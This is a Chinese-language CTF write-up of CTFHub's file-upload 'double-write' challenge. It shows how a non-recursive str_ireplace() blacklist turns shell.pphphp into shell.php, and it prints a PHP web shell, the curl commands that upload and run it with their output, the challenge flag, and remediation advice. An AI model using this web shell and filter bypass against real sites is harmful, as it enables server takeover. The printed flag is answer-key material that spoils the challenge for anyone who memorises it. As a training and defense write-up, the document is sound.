CTFHub - Web - 文件上传 - 双写绕过

# CTFHub # Web # 文件上传 # 双写绕过 # RCE

一、题目信息

  • 题目名称：文件上传 - 双写绕过
  • 题目方向：Web - 文件上传
  • 运行环境：PHP 7.3.14
  • 题目目标：利用非递归关键字删除的缺陷恢复 .php 后缀，上传 Web Shell 并读取 Flag。

二、漏洞分析

首页源码注释泄露了服务端过滤逻辑。程序先提取上传文件名，再使用 str_ireplace() 一次性删除黑名单关键字：

$name = basename($_FILES['file']['name']);
$blacklist = array("php", "php5", "php4", "php3", "phtml", "pht", ...);
$name = str_ireplace($blacklist, "", $name);

str_ireplace() 不会重新检查删除后拼接出的新字符串。将文件名设为 shell.pphphp 时，中间的 php 被删除后，前后剩余的字符会重新组成 php，最终得到 shell.php。

服务端随后把文件保存到 Web 可访问的 upload/ 目录，并且没有校验文件内容或禁止该目录执行 PHP，因此上传的脚本可以直接执行。

三、解题步骤

  1. 构造 PHP Payload：创建内容如下的 shell.txt，通过 c 参数执行系统命令。 
    <?php system($_GET["c"]); ?>
  2. 使用双写文件名上传：上传时将文件名指定为 shell.pphphp，服务端删除黑名单关键字后实际保存为 upload/shell.php。 
    curl -i -F "file=@shell.txt;filename=shell.pphphp" \
  -F "submit=Submit" \
  "http://<challenge-host>:10800/"
    关键响应内容： 
    上传文件相对路径
upload/shell.php
  3. 验证命令执行：访问 Web Shell，确认脚本以 www-data 身份运行。 
    curl --get \
  --data-urlencode "c=id; pwd; ls -la /var/www/html" \
  "http://<challenge-host>:10800/upload/shell.php"
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
/var/www/html/upload
  4. 定位 Flag 文件：列出 Web 根目录后看到题目生成的 Flag 文件。 
    ls -la /var/www/html
    /var/www/html/flag_158805931.php
  5. 读取 Flag：Flag 位于 PHP 文件的注释中，直接读取源码即可。 
    cat /var/www/html/flag_158805931.php
    <?php // ctfhub{82c140e7366edb945b831067}

四、最终 Flag

ctfhub{82c140e7366edb945b831067}

五、修复建议

  • 使用扩展名白名单：只允许业务需要的安全扩展名，不依赖黑名单过滤，尤其不能只删除关键字。
  • 规范化后重复校验：先归一化文件名，再检查完整扩展名；过滤后必须重新校验最终名称。
  • 服务端重命名：不保留用户可控的文件名和扩展名，由服务端生成随机文件名及固定安全后缀。
  • 校验文件内容：结合文件头、真实内容或文件解析结果判断类型，不能只相信客户端提供的名称。
  • 隔离上传目录：将上传文件存放在 Web 根目录之外，或关闭上传目录的脚本执行权限，并限制 Web 服务账户权限。
